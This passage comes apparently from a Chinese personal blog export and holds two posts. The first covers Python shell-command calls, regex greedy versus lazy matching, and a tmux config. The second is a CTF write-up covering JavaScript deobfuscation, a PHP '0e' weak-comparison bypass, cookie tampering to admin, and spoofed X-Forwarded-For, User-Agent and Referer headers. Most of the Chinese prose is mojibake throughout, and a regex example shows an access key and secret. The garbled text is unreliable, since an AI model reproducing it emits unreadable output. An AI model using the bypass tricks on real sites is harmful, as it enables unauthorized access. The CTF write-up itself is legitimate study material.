å¯ä»¥çœ‹åˆ°ç»“æœæ‰“å°å‡º0ï¼Œè¡¨ç¤ºå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼›å¦åˆ™è¡¨ç¤ºå¤±è´¥ï¼ˆå†æ¬¡æ‰§è¡Œè¯¥å‘½ä»¤ï¼Œè¾“å‡ºï¼šå­ç›®å½•æˆ–æ–‡ä»¶ test å·²ç»å­˜åœ¨ã€‚1ï¼‰\nå†æ¬¡æ‰§è¡Œ:\n mkdir: test: File exists\n256\n æ³¨ï¼Œè¿™ä¸ªæ–¹æ³•å¾—ä¸åˆ°shellå‘½ä»¤çš„è¾“å‡ºã€‚\n  popen()\nè¿™ä¸ªæ–¹æ³•èƒ½å¾—åˆ°å‘½ä»¤æ‰§è¡Œåçš„ç»“æœæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¦è‡ªè¡Œå¤„ç†æ‰èƒ½å¾—åˆ°æƒ³è¦çš„ä¿¡æ¯ã€‚\nimport os str = os.popen(\u0026#34;ls\u0026#34;).read() a = str.split(\u0026#34;\\n\u0026#34;) for b in a: print b è¾“å‡ºç»“æœä¸os.system('ls')ä¸€è‡´\n  commandsæ¨¡å—\nå¯ä»¥å¾ˆæ–¹ä¾¿çš„å–å¾—å‘½ä»¤çš„è¾“å‡ºï¼ˆåŒ…æ‹¬æ ‡å‡†å’Œé”™è¯¯è¾“å‡ºï¼‰å’Œæ‰§è¡ŒçŠ¶æ€ä½\nimport commands a,b = commands.getstatusoutput(\u0026#39;ls\u0026#39;) aæ˜¯é€€å‡ºçŠ¶æ€ bæ˜¯è¾“å‡ºçš„ç»“æœã€‚ \u0026gt;\u0026gt;\u0026gt; import commands \u0026gt;\u0026gt;\u0026gt; a,b = commands.getstatusoutput(\u0026#39;ls\u0026#39;) \u0026gt;\u0026gt;\u0026gt; print a 0 \u0026gt;\u0026gt;\u0026gt; print b Application Desktop Downloads commands.getstatusoutput(cmd)è¿”å›ï¼ˆstatus,output)\ncommands.getoutput(cmd)åªè¿”å›è¾“å‡ºç»“æœ\ncommands.getstatus(file)è¿”å›ls -ld file çš„æ‰§è¡Œç»“æœå­—ç¬¦ä¸²ï¼Œè°ƒç”¨äº†getoutputï¼Œä¸å»ºè®®ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ã€‚\n  subprocessæ¨¡å—\nä½¿ç”¨subprocessæ¨¡å—å¯ä»¥åˆ›å»ºæ–°çš„è¿›ç¨‹ï¼Œå¯ä»¥ä¸æ–°å»ºè¿›ç¨‹çš„è¾“å…¥/è¾“å‡º/é”™è¯¯ç®¡é“è¿é€šï¼Œå¹¶å¯ä»¥è·å¾—æ–°å»ºè¿›ç¨‹æ‰§è¡Œçš„è¿”å›çŠ¶æ€ã€‚ä½¿ç”¨subprocessæ¨¡å—çš„ç›®çš„æ˜¯æ›¿ä»£os.system()ã€os.popen*()ã€commands.*ç­‰æ—§çš„å‡½æ•°æˆ–æ¨¡å—ã€‚\nimport subprocess subprocess.call(command, shell=True) #ä¼šç›´æ¥æ‰“å°å‡ºç»“æœã€‚ subprocess.Popen(command, shell=True) #ä¹Ÿå¯ä»¥æ˜¯subprocess.Popen(command, stdout=subprocess.PIPE, shell=True) è¿™æ ·å°±å¯ä»¥è¾“å‡ºç»“æœäº†ã€‚ #å¦‚æœcommandä¸æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œshell=Trueæ˜¯ä¸å¯çœç•¥çš„ã€‚ #shell=Trueæ„æ€æ˜¯shellä¸‹æ‰§è¡Œcommand   æ­£åˆ™è¡¨è¾¾å¼ æ­£åˆ™è¡¨è¾¾å¼è‡ªå·±è¿˜æ˜¯æœ‰ç‚¹å¼±ï¼Œä¸»è¦æ˜¯ä¸€äº›åŸç†è‡ªå·±æœ‰ç‚¹æ‡’å¾—å»äº†è§£ï¼Œå°±å¯¼è‡´æ¯æ¬¡å†™æ­£åˆ™è‡ªå·±éƒ½å¾ˆè ¢\u0026hellip;\nè½¬è½½æ”¹ç¼–è‡ª:æ­£åˆ™è¡¨è¾¾å¼ - è´ªå©ªä¸éè´ªå©ªï¼ˆæƒ°æ€§ï¼‰ï¼ˆä¾µåˆ ï¼‰\nä½¿ç”¨åœºæ™¯ æœ‰æ—¶ï¼Œæˆ‘ä»¬æƒ³ç”¨æ­£åˆ™åŒ¹é…ä»¥æŸä¸ªå­ä¸²å¼€å¤´ï¼Œä¸”ä»¥æŸä¸ªå­ä¸²æˆ–å­—ç¬¦ç»“å°¾çš„å­å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ç»“å°¾çš„å­—ä¸²æˆ–å­—ç¬¦åœ¨åŸå­—ç¬¦ä¸²ä¸­å‡ºç°äº†å¤šæ¬¡ï¼Œä½†æˆ‘ä»¬åªæƒ³åŒ¹é…ä»å¼€å§‹å¤„åˆ°ç¬¬ä¸€æ¬¡å‡ºç°çš„åœ°æ–¹ï¼Œæ¢å¥è¯è¯´ï¼Œæƒ³å¾—åˆ°å¼€å§‹å’Œç»“å°¾ä¹‹é—´å†…å®¹æœ€å°‘çš„åŒ¹é…ã€‚\næ­£åˆ™çš„è´ªå©ªä¸éè´ªå©ªï¼ˆæƒ°æ€§ï¼‰ é€šå¸¸ä½¿ç”¨å¦‚ä¸‹å­—ç¬¦ç±»æè¿°å‰å¯¼å­—ç¬¦çš„é‡å¤ç‰¹å¾ï¼š\n  ?: å‘Šè¯‰å¼•æ“åŒ¹é…å‰å¯¼å­—ç¬¦0æ¬¡æˆ–ä¸€æ¬¡ã€‚äº‹å®ä¸Šæ˜¯è¡¨ç¤ºå‰å¯¼å­—ç¬¦æ˜¯å¯é€‰çš„ã€‚\n  +: å‘Šè¯‰å¼•æ“åŒ¹é…å‰å¯¼å­—ç¬¦1æ¬¡æˆ–å¤šæ¬¡ã€‚\n  *: å‘Šè¯‰å¼•æ“åŒ¹é…å‰å¯¼å­—ç¬¦0æ¬¡æˆ–å¤šæ¬¡ã€‚\n  {min, max}: å‘Šè¯‰å¼•æ“åŒ¹é…å‰å¯¼å­—ç¬¦minæ¬¡åˆ°maxæ¬¡ã€‚minå’Œmaxéƒ½æ˜¯éè´Ÿæ•´æ•°ã€‚å¦‚æœæœ‰é€—å·è€Œmaxè¢«çœç•¥äº†ï¼Œåˆ™è¡¨ç¤ºmaxæ²¡æœ‰é™åˆ¶ï¼›å¦‚æœé€—å·å’Œmaxéƒ½è¢«çœç•¥äº†ï¼Œåˆ™è¡¨ç¤ºé‡å¤minæ¬¡ã€‚ å› æ­¤ {0,} å’Œ * ä¸€æ ·ï¼Œ{1,} å’Œ + çš„ä½œç”¨ä¸€æ ·ã€‚\n  è´ªå©ªä¸éè´ªå©ª è´ªå©ª : é»˜è®¤æƒ…å†µä¸‹ï¼Œ? + * {min, max}éƒ½æ˜¯è´ªå©ªçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä¼šæ ¹æ®å‰å¯¼å­—ç¬¦å»åŒ¹é…å°½å¯èƒ½å¤šçš„å†…å®¹ã€‚\néè´ªå©ª(æƒ°æ€§) : éè´ªå©ªå°±æ˜¯åŒ¹é…å°½å¯èƒ½å°‘çš„å†…å®¹ã€‚\nåŸç†æµ…æ ç»“åˆå®ä¾‹æ¥åˆ†æå“ˆåŸºäºæ­£åˆ™çš„å¼•æ“å¯¹æ–‡æœ¬çš„åŒ¹é…è¿‡ç¨‹ã€‚åŸå§‹å­—ç¬¦ä¸²ï¼šThis is a \u0026lt;EM\u0026gt;first\u0026lt;/EM\u0026gt; testï¼Œä½¿ç”¨æ­£åˆ™\u0026lt;.+\u0026gt;æ¥åŒ¹é…HTMLæ ‡ç­¾ï¼ŒæœŸæœ›ç¬¬ä¸€æ¬¡åŒ¹é…å¾—åˆ°\u0026lt;EM\u0026gt;ï¼Œç¬¬äºŒæ¬¡åŒ¹é…å¾—åˆ°\u0026lt;/EM\u0026gt;ï¼Œå®é™…å´æ˜¯ç¬¬ä¸€æ¬¡åŒ¹é…å°±å¾—åˆ°äº†\u0026lt;EM\u0026gt;first\u0026lt;/EM\u0026gt;ã€‚\næ¥çœ‹çœ‹åŒ¹é…è¿‡ç¨‹ï¼Œç¬¬ä¸€ä¸ªè®°å·æ˜¯\u0026lt;ï¼Œè¿™æ˜¯ä¸€ä¸ªæ–‡æœ¬å­—ç¬¦ï¼ŒåŒ¹é…å…¶è‡ªèº«ã€‚ç¬¬äºŒä¸ªç¬¦å·æ˜¯.ï¼ŒåŒ¹é…äº†å­—ç¬¦Eï¼Œç„¶å+ä¸€ç›´å¯ä»¥åŒ¹é…å…¶ä½™çš„å­—ç¬¦ï¼Œç›´åˆ°ä¸€è¡Œçš„ç»“æŸã€‚ç„¶ååˆ°äº†æ¢è¡Œç¬¦ï¼ŒåŒ¹é…å¤±è´¥ï¼ˆ.ä¸åŒ¹é…æ¢è¡Œç¬¦ï¼‰ã€‚äºæ˜¯å¼•æ“å¼€å§‹å¯¹ä¸‹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ç¬¦å·è¿›è¡ŒåŒ¹é…ï¼Œå³è¯•å›¾åŒ¹é…\u0026gt;ã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œ\u0026lt;.+å·²ç»åŒ¹é…äº†\u0026lt;EM\u0026gt;first\u0026lt;/EM\u0026gt; testã€‚å¼•æ“ä¼šè¯•å›¾å°†\u0026gt;ä¸æ¢è¡Œç¬¦è¿›è¡ŒåŒ¹é…ï¼Œç»“æœå¤±è´¥äº†ã€‚äºæ˜¯å¼•æ“è¿›è¡Œå›æº¯ã€‚å›æº¯åçš„åŒ¹é…çŠ¶å†µæ˜¯ \u0026lt;.+ åŒ¹é… \u0026lt;EM\u0026gt;first\u0026lt;/EM\u0026gt; tesã€‚äºæ˜¯å¼•æ“å°†\u0026gt;ä¸tè¿›è¡ŒåŒ¹é…ã€‚æ˜¾ç„¶è¿˜æ˜¯ä¼šå¤±è´¥ã€‚è¿™ä¸ªè¿‡ç¨‹ç»§ç»­ï¼Œç›´åˆ° \u0026lt;.+ åŒ¹é… \u0026lt;EM\u0026gt;first\u0026lt;/EMï¼Œ\u0026gt;ä¸\u0026gt;åŒ¹é…ã€‚äºæ˜¯å¼•æ“æ‰¾åˆ°äº†ä¸€ä¸ªåŒ¹é…\u0026lt;EM\u0026gt;first\u0026lt;/EM\u0026gt;ã€‚è®°ä½ï¼Œæ­£åˆ™å¯¼å‘çš„å¼•æ“æ˜¯æ€¥åˆ‡çš„ï¼Œæ‰€ä»¥å®ƒä¼šæ€¥ç€æŠ¥å‘Šå®ƒæ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªåŒ¹é…ã€‚è€Œä¸æ˜¯ç»§ç»­å›æº¯ï¼Œå³ä½¿å¯èƒ½ä¼šæœ‰æ›´å¥½çš„åŒ¹é…ï¼Œä¾‹å¦‚\u0026lt;EM\u0026gt;ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç”±äº+çš„è´ªå©ªæ€§ï¼Œä½¿å¾—æ­£åˆ™è¡¨è¾¾å¼å¼•æ“è¿”å›äº†ä¸€ä¸ªæœ€å·¦è¾¹çš„æœ€é•¿çš„åŒ¹é…ã€‚\nå¦‚æœæƒ³å¾—åˆ°æœŸæœ›çš„ç»“æœï¼Œå°±éœ€è¦å¯ç”¨éè´ªå©ªæ¨¡å¼ï¼š\u0026lt;.+?\u0026gt;\næ€»ç»“ï¼šå¦‚æœæ˜¯è´ªå©ªåŒ¹é…æ¨¡å¼ï¼Œæ­£åˆ™å¼•æ“ä¼šä¸€ç›´åŒ¹é…åˆ°å­—ç¬¦ä¸²æœ€åï¼›å½“åŒ¹é…ä¸ºfalseæ—¶ï¼Œå°±å›æº¯ä»¥æ‰¾åˆ°å€’æ•°ç¬¬ä¸€ä¸ªåŒ¹é…ä½ç½®ï¼Œè¿”å›åŒ¹é…ç»“æœã€‚ å¦‚æœæ˜¯éè´ªå©ªåŒ¹é…æ¨¡å¼ï¼Œæ­£åˆ™å¼•æ“ä¼šåŒ¹é…åˆ°ç¬¦åˆpatternçš„æœ«å°¾ä½ç½®é‚£ä¸ªå­—ç¬¦ï¼Œç„¶åå†å¾€åèµ°ä¸€æ­¥ï¼Œå‘ç°åŒ¹é…ä¸ºfalseæ—¶ï¼Œå°±å›æº¯ä»¥æ‰¾åˆ°æœ€è¿‘ä¸€ä¸ªåŒ¹é…ä¸ºtrueçš„ä½ç½®ï¼Œè¿”å›åŒ¹é…ç»“æœã€‚\nå®ä¾‹ ä¾‹å¦‚ï¼ŒåŸå§‹å­—ç¬¦ä¸²ï¼š\n{\u0026quot;accesskey\u0026quot;:{\u0026quot;acccessKeyId\u0026quot;:\u0026quot;XhUURxsMlJE6EiXf\u0026quot;,\u0026quot;accessKeySecret\u0026quot;:\u0026quot;Q9fMpgBgRnKycMRD28MMkkFMbiNkbY\u0026quot;},\u0026quot;dbGrant\u0026quot;:{\u0026quot;0000031736\u0026quot;:\u0026quot;READWRITE\u0026quot;},\u0026quot;dbSchemaId\u0026quot;:\u0026quot;0000031737\u0026quot;} ç°åœ¨æƒ³æŠŠè¿™éƒ¨åˆ†æ•æ„Ÿä¿¡æ¯æ›¿æ¢ä¸ºç©ºå­—ç¬¦ä¸²ï¼š\n\u0026quot;accesskey\u0026quot;:{\u0026quot;acccessKeyId\u0026quot;:\u0026quot;XhUURxsMlJE6EiXf\u0026quot;,\u0026quot;accessKeySecret\u0026quot;:\u0026quot;Q9fMpgBgRnKycMRD28MMkkFMbiNkbY\u0026quot;}, å…ˆä¸è€ƒè™‘ç»“å°¾çš„é€—å·ï¼Œå°è¯•æ­£åˆ™ï¼š\u0026quot;accesskey\u0026quot;:\\{.+\\}ï¼Œç›´æ¥åŒ¹é…è‡³åŸå§‹å­—ç¬¦ä¸²ç»“å°¾çš„}å­—ç¬¦ï¼Œå› ä¸ºå¼•æ“é»˜è®¤ä¼šåŒ¹é…å°½å¯èƒ½å¤šçš„å†…å®¹ã€‚\nè€ƒè™‘åˆ°è´ªå©ªæ€§ï¼Œå°†æ­£åˆ™ä¿®æ”¹ä¸ºï¼š\u0026quot;accesskey\u0026quot;:\\{.+\\}+?ï¼ŒåŒ¹é…ç»“æœä¸€æ ·ã€‚çº³å°¼ï¼Ÿéš¾é“æˆ‘å¯¹è´ªå©ªæ€§çš„ç†è§£æœ‰é—®é¢˜ã€‚æ¢³ç†å“ˆä½¿ç”¨å§¿åŠ¿ï¼Œæˆ‘æœŸæœ›å®ƒåŒ¹é…åˆ°å¼€å§‹ä½ç½®ä¹‹åå‡ºç°çš„ç¬¬ä¸€ä¸ª}å­—ç¬¦ï¼Œå¯¹åº”çš„è¡¨è¾¾å¼éƒ¨åˆ†ä¸º}+?ã€‚å¥—ç”¨éè´ªå©ªæ¨¡å¼åˆ†æé—®é¢˜ï¼ŒæœŸæœ›å¯¹ä¸€ä¸ªæˆ–å¤šä¸ª}å­—ç¬¦è¿›è¡ŒåŒ¹é…ï¼Œä¸”åŒ¹é…å°½å¯èƒ½å°‘çš„å†…å®¹ï¼Œä½†åœ¨åŸå§‹ä¸²ä¸­ï¼Œ}å­—ç¬¦éƒ½æ˜¯åˆ†å¼€çš„ï¼Œæ²¡æœ‰è¿ç»­ï¼Œæ— è®ºå¦‚ä½•åªèƒ½åŒ¹é…ä¸€ä¸ªå•ç‹¬çš„}å­—ç¬¦ã€‚å¯è§å¯¹}å­—ç¬¦å¼€å¯éè´ªå©ªæ¨¡å¼åŒ¹é…è¡Œä¸é€šã€‚\næƒ³è¦åŒ¹é…åˆ°å¼€å§‹ä½ç½®ä¹‹åå‡ºç°çš„ç¬¬ä¸€ä¸ª}å­—ç¬¦ ä¹Ÿå¯ä»¥è¡¨è¾¾ä¸º å¼€å§‹ä½ç½®å’Œæœ«å°¾}å­—ç¬¦ä¹‹é—´çš„å†…å®¹æœ€å°‘ï¼Œå¯¹åº”æ­£åˆ™éƒ¨åˆ†ä¿®æ”¹ä¸ºï¼š.+?ï¼Œå®Œæ•´è¡¨è¾¾å¼ï¼š\u0026quot;accesskey\u0026quot;:\\{.+?\\}ï¼Œæµ‹è¯•åŒ¹é…ç»“æœï¼Œå¦¥å¦¥çš„ã€‚\nä»¥ä¸Šå‡ä¸ºè½¬è½½ï¼Œè¿™é‡Œè®²è®²è‡ªå·±çš„å®ä¾‹\nsid=14d8f776-a969-4252-b35a-f83a807e7f2d;userName=111111111; ç›®çš„æ˜¯åŒ¹é…\nsid=14d8f776-a969-4252-b35a-f83a807e7f2d; ä¸€å¼€å§‹è‡ªå·±çç³Šå¼„äº†åŠå¤©ï¼Œæœ€åæ‰¾åˆ°äº†æ¯”è¾ƒæ¥è¿‘çš„sid=.*;ï¼Œå¯æ˜¯è¿™ä¸ªç›´æ¥åŒ¹é…åˆ°äº†è¡Œæœ«ï¼ŒæŠŠuserNameä¸€èµ·åŒ…å«è¿›å»äº†ï¼Œè¿™æ—¶å€™å°±è¦è€ƒè™‘åˆ°éè´ªå©ªæ€§äº†ï¼Œå³sid=.*?;å°±å¯ä»¥åŒ¹é…åˆ°ç¬¬ä¸€ä¸ªé‡åˆ°çš„;\nåˆå¦‚\n1087080534*1062477688-245892309-863670697+1430950488-2128604487+787613783-929770459-331572804*1754549713+81041939=?; åŒ¹é…å‰é¢çš„ç®—æ•°è¡¨è¾¾å¼ï¼ˆ=å‰é¢çš„è¡¨è¾¾å¼ä¸åŒ…æ‹¬=ï¼‰\nè‡ªå·±ä¹Ÿçç³Šå¼„äº†å¥½ä¹…ï¼Œä¸€å¼€å§‹å†™çš„æ˜¯.*=æ­»æ´»éƒ½åŒ…å«äº†=ï¼Œè¿™å°±å¾ˆçƒ¦äº†\nç„¶åè®¤çœŸå»çœ‹äº†æ­£åˆ™ï¼Œç”¨äº†[^]ï¼Œè§£é‡Šæ˜¯\n Match any character that is not in the set.\n å°±æ˜¯åŒ¹é…ä»»ä½•ä¸åŒ…å«è¿™ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²\næ‰€ä»¥æœ€åæ˜¯^[^=]*\nè¿˜æœ‰å¯¹äº\nè·‘çš„è¿˜ä¸é”™ï¼Œç»™ä½ flagå§: NzI3NTY3 åŒ¹é…æœ€åçš„base64å­—ç¬¦ä¸²ï¼Œä¹‹å‰è€ƒè™‘çš„æ˜¯(?=:).*\nä½†æ˜¯è¿˜æ˜¯è€é—®é¢˜è€æ˜¯åŒ¹é…äº†:\u0026hellip;?\u0026lt;åœ¨pythonä¸­ä¸èƒ½ç”¨â€¦è¿™å°±æ¯”è¾ƒéº»çƒ¦äº†\nç„¶åæŸ¥äº†ä¸€ä¸‹å‘ç°å¯ä»¥ç”¨groupæ¥å¼„ï¼Œå·®ä¸å¤šå°±æ˜¯ç»™ä»–ä»¬åˆ†ç»„çš„æ„æ€\n(.*)(: )(.*) è¿™å°±åˆ†æˆäº†ä¸‰ç»„ï¼Œç¬¬ä¸€ç»„åŒ¹é…çš„æ˜¯ä¸­æ–‡ï¼Œç¬¬äºŒç»„åŒ¹é…çš„æ˜¯: ï¼Œç¬¬ä¸‰ç»„åŒ¹é…çš„å°±æ˜¯æœ€åçš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æå–group(3)å°±å¥½äº†ã€‚\nTmuxé…ç½®è®°å½• è¯¦æƒ…å‚è€ƒtmuxé…ç½®\n#-- base --# set -g default-terminal \u0026#34;screen-256color\u0026#34; set -g display-time 3000 set -g history-limit 10000 set -g base-index 1 set -g pane-base-index 1 set -s escape-time 0 set -g mouse on #-- bindkeys --# # split windows like vim. - Note: vim\u0026#39;s definition of a horizontal/vertical split is reversed from tmux\u0026#39;s unbind s bind s split-window -v bind S split-window -v -l 40 bind v split-window -h bind V split-window -h -l 120 # navigate panes with hjkl bind h select-pane -L bind j select-pane -D bind k select-pane -U bind l select-pane -R # key bindings for horizontal and vertical panes unbind % bind | split-window -h # ä½¿ç”¨|ç«–å±ï¼Œæ–¹ä¾¿åˆ†å± unbind \u0026#39;\u0026#34;\u0026#39; bind - split-window -v # ä½¿ç”¨-æ¨ªå±ï¼Œæ–¹ä¾¿åˆ†å± # swap panes bind ^u swapp -U bind ^d swapp -D bind q killp bind ^e last unbind r bind r source-file ~/.tmux.conf \\; display \u0026#34;Configuration Reloaded!\u0026#34; #-- statusbar --# set -g status-justify centre set -g status-left \u0026#34;#[fg=red]s#S:w#I.p#P#[default]\u0026#34; set -g status-right \u0026#39;[#(whoami)#(date +\u0026#34; %m-%d %H:%M \u0026#34;)]\u0026#39; set -g status-left-attr bright set -g status-left-length 120 set -g status-right-length 120 set -g status-utf8 on set -g status-interval 1 set -g visual-activity on setw -g monitor-activity on setw -g automatic-rename off # default statusbar colors set -g status-bg colour235 #base02 set -g status-fg colour136 #yellow set -g status-attr default # default window title colors setw -g window-status-fg colour244 setw -g window-status-bg default #setw -g window-status-attr dim # active window title colors setw -g window-status-current-fg colour166 #orange setw -g window-status-current-bg default #setw -g window-status-current-attr bright # window title string (uses statusbar variables) set -g set-titles-string \u0026#39;#T\u0026#39; set -g status-justify \u0026#34;centre\u0026#34; set -g window-status-format \u0026#39;#I #W\u0026#39; set -g window-status-current-format \u0026#39; #I #W \u0026#39; # pane border set -g pane-active-border-fg \u0026#39;#55ff55\u0026#39; set -g pane-border-fg \u0026#39;#555555\u0026#39; # message text set -g message-bg colour235 #base02 set -g message-fg colour166 #orange # pane number display set -g display-panes-active-colour colour33 #blue set -g display-panes-colour colour166 #orange # clock setw -g clock-mode-colour colour64 #green # ä¿®æ”¹è¿›å…¥å‘½ä»¤æ¨¡å¼æŒ‰é”® # remap prefix to Control + a # set -g prefix C-a # unbind C-b # bind C-a send-prefix ","date":"2018-04-13T00:26:00Z","permalink":"https://blog.zeddyu.info/2018/04/13/%E5%87%A0%E9%81%93%E9%A2%98%E4%B8%AD%E7%9A%84%E5%AD%A6%E4%B9%A0/","title":"å‡ é“é¢˜ä¸­çš„å­¦ä¹ "},{"content":"ç”±äºæ°´å¹³æœ‰é™ï¼Œå°±å†™å†™è‡ªå·±åšå‡ºæ¥çš„é¢˜ç›®ã€‚\nWeb Level - week1 è¿™éƒ¨åˆ†è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„è¯´\nAre you from Europe? è¿›å»ä¸€çœ‹ï¼Œå‘€ï¼Œç«Ÿç„¶æ˜¯æŠ½SSRï¼Œçœ‹æ¥æˆ‘ä»¬è¿™ç§éé…‹åº”è¯¥æ˜¯æ²¡ä»€ä¹ˆæ‰‹æ°”äº†å§ã€‚\nç›´æ¥çœ‹æºä»£ç ï¼Œå‘ç°æœ€åæœ‰\neval(function(p,a,c,k,e,d){e=function(c){return(c\u0026lt;a?\u0026quot;\u0026quot;:e(parseInt(c/a)))+((c=c%a)\u0026gt;35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;}('w p(){b a=l(\u0026quot;8ï¼kï¼Œj 8 o 1 mï¼Ÿ\u0026quot;);5(!$(\u0026quot;#4\u0026quot;).7()\u0026amp;\u0026amp;!$(\u0026quot;#9\u0026quot;).7()){2(\u0026quot;iã€‚\u0026quot;);f}b 1=\u0026quot;\u0026quot;;1+=\u0026quot;\u0026quot;;1+=\u0026quot;\u0026quot;;1+=\u0026quot;\u0026quot;;1+=\u0026quot;y\u0026quot;;1+=\u0026quot;{\u0026quot;;1+=\u0026quot;g\u0026quot;;1+=\u0026quot;h\u0026quot;;1+=\u0026quot;3\u0026quot;;1+=\u0026quot;6\u0026quot;;1+=\u0026quot;v\u0026quot;;1+=\u0026quot;h\u0026quot;;1+=\u0026quot;0\u0026quot;;1+=\u0026quot;s\u0026quot;;1+=\u0026quot;e\u0026quot;;1+=\u0026quot;u\u0026quot;;1+=\u0026quot;6\u0026quot;;1+=\u0026quot;0\u0026quot;;1+=\u0026quot;n\u0026quot;;1+=\u0026quot;r\u0026quot;;1+=\u0026quot;!\u0026quot;;1+=\u0026quot;}\u0026quot;;5(a){$(\u0026quot;#4\u0026quot;).d();$(\u0026quot;#9\u0026quot;).d();2(\u0026quot;tã€‚1: \u0026quot;+1)}q{2(\u0026quot;xã€‚\u0026quot;)}}',35,35,'|flag|alert||serv5|if|_|html|SSR|craft5|buy|var||remove||return|T||ä½ æ ¹æœ¬ä¸æ˜¯æ¬§æ´²äºº|ä½ æ„¿æ„çŒ®ç¥­ä½ å…¨éƒ¨çš„|æ¬§æ´²äºº|confirm|å—||æ¥è·å–|soHappy|else|E||å…‘æ¢æˆåŠŸ|N|C|function|ä½ å¤±å»äº†å”¯ä¸€çš„æœºä¼š|hgame'.split('|'),0,{})) ä¸€çœ‹å°±æ˜¯jsæ··æ·†ï¼Œç›´æ¥ä¸¢å»è§£å¯†\nå¾—åˆ°\nfunction soHappy() { var buy = confirm(\u0026quot;SSRï¼æ¬§æ´²äººï¼Œä½ æ„¿æ„çŒ®ç¥­ä½ å…¨éƒ¨çš„ SSR æ¥è·å– flag å—ï¼Ÿ\u0026quot;); if (!$(\u0026quot;#serv5\u0026quot;).html() \u0026amp;\u0026amp; !$(\u0026quot;#craft5\u0026quot;).html()) { alert(\u0026quot;ä½ æ ¹æœ¬ä¸æ˜¯æ¬§æ´²äººã€‚\u0026quot;); return } var flag = \u0026quot;\u0026quot;; flag += \u0026quot;\u0026quot;; flag += \u0026quot;\u0026quot;; flag += \u0026quot;\u0026quot;; flag += \u0026quot;hgame\u0026quot;; flag += \u0026quot;{\u0026quot;; flag += \u0026quot;T\u0026quot;; flag += \u0026quot;h\u0026quot;; flag += \u0026quot;3\u0026quot;; flag += \u0026quot;_\u0026quot;; flag += \u0026quot;C\u0026quot;; flag += \u0026quot;h\u0026quot;; flag += \u0026quot;0\u0026quot;; flag += \u0026quot;s\u0026quot;; flag += \u0026quot;e\u0026quot;; flag += \u0026quot;N\u0026quot;; flag += \u0026quot;_\u0026quot;; flag += \u0026quot;0\u0026quot;; flag += \u0026quot;n\u0026quot;; flag += \u0026quot;E\u0026quot;; flag += \u0026quot;!\u0026quot;; flag += \u0026quot;}\u0026quot;; if (buy) { $(\u0026quot;#serv5\u0026quot;).remove(); $(\u0026quot;#craft5\u0026quot;).remove(); alert(\u0026quot;å…‘æ¢æˆåŠŸã€‚flag: \u0026quot; + flag) } else { alert(\u0026quot;ä½ å¤±å»äº†å”¯ä¸€çš„æœºä¼šã€‚\u0026quot;) } } å¾—åˆ°flag\nspecial number è¿™é¢˜ä¸€å¼€å§‹æˆ‘è¿˜æ²¡åšå‡ºæ¥233333ï¼Œæœç„¶è‡ªå·±è¿˜æ˜¯å¤ªèœäº†ã€‚ é¢˜ç›®ç›´æ¥ç»™å‡ºä»£ç \ninclude_once(\u0026quot;flag.php\u0026quot;); if(isset($_GET['key'])){ $pattern = '/^(?=.*[0-9].*)(?=.*[a-zA-Z].*).{7,}$/ '; $key = $_GET['key']; if(preg_match($pattern,$key)===0){ echo \u0026quot;æ ¼å¼é”™è¯¯\u0026quot;; }else{ $lock=\u0026quot;******************\u0026quot;; $b = json_decode($key); if($b==$lock) echo $flag; else echo \u0026quot;this is no special number\u0026quot;; } } è¿™é¢˜ä¾¿æ˜¯ä¸€ä¸ªphpå¼±ç›¸ç­‰çš„é¢˜ï¼Œè¿™ä¸ªæ­£åˆ™å°±æ˜¯ä¸€ä¸²æ•°å­—è·Ÿå­—æ¯ äºæ˜¯ä¾¿æƒ³åˆ°äº†æ¯”è¾ƒç»å…¸çš„0e è¯•äº†ä¸€ä¸‹key=0e11111111111ï¼Œå°±è¿‡äº†23333.\ncan u find me? é¢˜ç›®å¾ˆç›´æ¥åœ°æç¤ºäº†\nonly robot know where is the flag äºæ˜¯robots.txtäº†è§£ä¸€ä¸‹\nUser-agent: * Disallow: /f1aaaaaaaag.php è¿™å°±æ²¡ä»€ä¹ˆæ„æ€äº†ã€‚ã€‚\nç»“æœè¿˜æ²¡å®Œï¼Œå¿ƒé‡Œåˆä¸€é«˜å…´\nonly admin can get flag çœ‹åˆ°Cookie\nCookie:user=guest jsä¿®æ”¹cookieäº†è§£ä¸€ä¸‹ï¼Œç„¶åæ‹¿åˆ°flag\ntell me what you want æ ¹æ®æç¤ºè¾“å…¥flag\nrequest method is error.I think POST is better å¾ˆæ˜æ˜¾çš„æç¤ºï¼Œç„¶åæ”¹æˆPOSTå‘åŒ…ï¼Œbodyä¸ºwant=flag\nå¾—åˆ°Response:\nhttps://www.wikiwand.com/en/X-Forwarded-For only localhost can get flag åœ¨ä¿®æ”¹è¯·æ±‚å¤´X-Forwarded-Forä¸º127.0.0.1\nå¾—åˆ°Rep:\n\u0026lt;br/\u0026gt;https://www.wikiwand.com/en/User_agent \u0026lt;br/\u0026gt;please use Icefox/57.0 è¿™ä¸ªå°±ä¸èƒ½ç›´æ¥ä¿®æ”¹uaä¸ºIcefox/57.0äº†ï¼Œå¾—å¸¦ä¸Šæ™®é€šæµè§ˆå™¨çš„uaï¼Œéšä¾¿æ‹¿ä¸ªfirefoxçš„uaè¿›è¡Œä¿®æ”¹\nMozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0 æ”¹æˆ Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Icefox/57.0 å¾—åˆ°Rep:\n\u0026lt;br/\u0026gt;https://www.wikiwand.com/en/HTTP_referer \u0026lt;br/\u0026gt;the requests should referer from www.google.com 